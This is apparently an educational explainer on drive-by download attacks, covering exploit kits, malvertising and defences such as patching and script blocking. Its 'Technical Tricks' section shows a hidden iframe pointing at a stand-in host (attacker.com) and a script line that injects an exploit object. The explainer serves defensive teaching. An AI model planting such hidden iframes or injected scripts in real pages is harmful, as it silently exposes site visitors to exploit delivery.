### **Definition**

A **drive-by download** happens when **just visiting a website** causes malicious code to be downloaded (and sometimes executed) on your system — **without your consent**.

---

## 🛠️ **How It Works**

There are two main flavors:

### 1. **Authorized but Deceptive Download**

* The site tricks you into clicking something (e.g., “You need this update to watch the video”).
* File is downloaded, and user executes it.
* *This requires some social engineering.*

### 2. **Silent Exploitation**

* You don’t click anything — simply **loading the page** is enough.
* Attackers embed hidden elements like:

  * **Hidden iFrames** → loads exploit code from attacker’s server.
  * **JavaScript / Flash / Java** → exploit browser or plugin vulnerabilities.
  * **Exploit Kits** (e.g., Angler, RIG, Nuclear) → test your system for known vulnerabilities and deliver the right exploit.
* Once an exploit succeeds, the payload (ransomware, trojan, etc.) is dropped and executed.

## 🔬 **Technical Tricks Used**

1. **Hidden iFrames**

   ```html
   <iframe src="http://attacker.com/exploit" style="display:none;"></iframe>
   ```

   Loads exploit code invisibly.

2. **Malicious JavaScript**

   ```js
   // obfuscated JS that triggers vulnerable plugin
   document.write("<object data='exploit.swf'></object>");
   ```

3. **Exploit Kits**

   * Act like “malware vending machines.”
   * Example workflow:

     * Check your **browser version**, **OS**, and **plugins**.
     * Pick an exploit you’re vulnerable to (e.g., Flash zero-day).
     * Deliver payload (ransomware, keylogger, etc.).

## 📜 **Famous Examples**

* **Angler EK (Exploit Kit)** → Spread ransomware like CryptoWall.
* **Nuclear EK** → Targeted Flash and IE vulnerabilities.
* **Blackhole EK** → Widely used in 2012–2013.
* **Malvertising campaigns** → Legit ads injected with iFrames pointing to exploit kits.

## 🛡️ **Defense Against Drive-by Downloads**

1. **Patch, Patch, Patch** → Keep browsers, plugins, and OS up to date.
2. **Remove risky plugins** (Flash, Java, Silverlight).
3. **Browser hardening**:

   * Use NoScript / uBlock Origin (blocks scripts/iFrames by default).
   * Use sandboxed browsers or VM for risky browsing.
4. **Security solutions**:

   * IDS/IPS to detect exploit kit traffic.
   * EDR with memory scanning (important for fileless attacks).
5. **Threat intelligence** → Block domains known for exploit kit activity.

## 🔑 Key Difference

Unlike phishing or droppers, drive-by downloads are dangerous because:

* **User interaction isn’t required.**
* Exploits are **automatic**.
* Often combined with **malvertising** to reach many victims.
